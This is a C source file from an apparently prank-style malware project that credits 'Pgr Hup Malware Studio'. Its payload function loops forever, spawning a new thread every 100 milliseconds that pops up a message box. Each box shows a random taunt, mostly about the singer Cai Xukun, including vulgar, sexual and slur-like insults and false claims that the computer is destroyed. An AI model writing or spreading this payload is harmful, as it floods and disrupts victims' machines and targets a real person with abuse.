#include "payloads.h"

#define PopUp_Delay 100
#define texts_count 4

DWORD WINAPI popup_messagebox(LPVOID argument);

//Sorry, I wrote this ugly format :(
//But, Who care?
//                    ------Cyat_Yrna

const char* texts[] = { "你想杀死蔡徐坤?", "你的电脑要被蔡徐坤摧毁啦！哈！哈！哈！哈！", "此台电脑被蔡徐坤尿过", "你的电脑被蔡徐坤操了！", "鸡你太美", "你打球像蔡徐坤", "蔡徐坤nmsl!", "鸡你实在是太美", 
						"ikun的真正含义是I want to Kill the United Nations!我要歼灭联合国!这是反动组织，建议击毙！", "母狗蔡徐坤永垂不朽", "没想到吧，爸爸也是黑粉", 
						"bilibili创建于2009年6月26日被，粉丝们亲切的称为“B站”。现为国内领先的年轻人文化社区",
						"本恶意软件由Pgr Hup Malware Studio工作室制作", "你的电脑已被摧毁", "被蔡徐坤吊打吧！哈！哈！哈！", "你的电脑即将死机XD", "下面请欣赏亚洲人妖残忍操大球", "我警告过你了…" };

DWORD WINAPI payload_messageboxes(LPVOID argument)
{
	while(1)
	{
		CreateThread(NULL, NULL, popup_messagebox, NULL, NULL, NULL);
		Sleep(PopUp_Delay);
	}
}

DWORD WINAPI popup_messagebox(LPVOID argument)
{
	MessageBox(NULL, texts[rand() % texts_count], "蔡徐坤", NULL);
	return 0;
}
